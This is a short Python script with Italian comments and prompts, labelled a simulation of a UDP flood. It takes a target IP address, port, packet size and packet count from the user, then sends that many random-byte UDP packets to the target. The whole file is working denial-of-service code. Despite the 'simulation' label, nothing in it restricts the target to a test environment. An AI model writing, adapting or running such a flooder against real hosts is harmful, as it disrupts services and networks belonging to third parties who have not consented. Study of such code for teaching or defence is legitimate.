import socket
import random

# Funzione principale per simulare l'UDP flood
def udp_flood(target_ip, target_port, packet_size, packet_count):
    try:
        print("[DEBUG] Creazione del socket UDP")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print("\nInizio dell'attacco UDP flood")
        
        print(f"[DEBUG] Generazione del pacchetto di {packet_size} byte")
        packet = random.randbytes(packet_size)

        for i in range(packet_count):
            # Invio del pacchetto al target
            sock.sendto(packet, (target_ip, target_port))
            print(f"[DEBUG] Pacchetto {i + 1}/{packet_count} inviato a {target_ip}:{target_port}")

        print("\nAttacco completato con successo.")
    except Exception as e:
        print(f"Errore durante l'attacco: {e}")
    finally:
        print("[DEBUG] Chiusura del socket")
        sock.close()

# Funzione per gestire l'input utente
def main():
    print("Simulazione di un UDP flood")

    target_ip = input("Inserisci l'IP della macchina target: ")
    print(f"[DEBUG] IP Target inserito: {target_ip}")
    
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    print(f"[DEBUG] Porta Target inserita: {target_port}")
    
    packet_size = int(input("Inserisci la dimensione del pacchetto in byte (default: 1024): ") or 1024)
    print(f"[DEBUG] Dimensione pacchetto inserita: {packet_size}")
    
    packet_count = int(input("Inserisci il numero di pacchetti da inviare: "))
    print(f"[DEBUG] Numero di pacchetti inserito: {packet_count}")

    print(f"\nTarget: {target_ip}:{target_port}")
    print(f"Dimensione del pacchetto: {packet_size} byte")
    print(f"Numero di pacchetti: {packet_count}")

    udp_flood(target_ip, target_port, packet_size, packet_count)

if __name__ == "__main__":
    main()
